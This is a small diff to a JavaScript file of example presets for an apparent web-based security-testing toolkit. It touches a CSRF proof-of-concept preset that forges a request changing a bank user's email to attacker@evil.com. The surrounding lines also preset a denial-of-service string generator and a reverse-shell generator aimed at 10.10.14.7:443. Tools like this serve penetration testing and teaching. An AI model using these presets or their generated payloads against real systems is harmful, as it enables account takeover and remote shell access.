@@ -3607,7 +3607,7 @@ const EXAMPLES = {
   'notationer': () => { exFill('not-in', ['userProfileId', 'max retry count', 'HTTP-Response-Code', 'is_admin_user', 'API_KEY_SECRET'].join('\n')); },
 
   // ---- Payloads ----
-  'csrf-poc': () => { exFill('csrf-raw', `POST /account/email HTTP/1.1\nHost: bank.example.com\nCookie: session=eyJ1c2VyIjoidmljdGltIn0\nContent-Type: application/x-www-form-urlencoded\n\nemail=attacker%40evil.com`); exFill('csrf-scheme', 'HTTPS'); exFill('csrf-submit', 'Auto-submit'); exClick('csrf-gen'); },
+  'csrf-poc': () => { exFill('csrf-raw', `POST /account/email HTTP/1.1\nHost: bank.example.com\nCookie: session=eyJ1c2VyIjoidmljdGltIn0\nContent-Type: application/x-www-form-urlencoded\n\nemail=attacker%40evil.com`); exFill('csrf-scheme', 'https'); exFill('csrf-submit', 'auto'); exClick('csrf-gen'); },
   'dos-gen': () => { exFill('dos-text', 'A'); exFill('dos-count', '50000'); exClick('dos-preview'); },
   'revshell': () => { exFill('rsg-ip', '10.10.14.7'); exFill('rsg-port', '443'); exFill('rsg-shell', 'bash'); exFill('rsg-enc', 'b64'); },
 
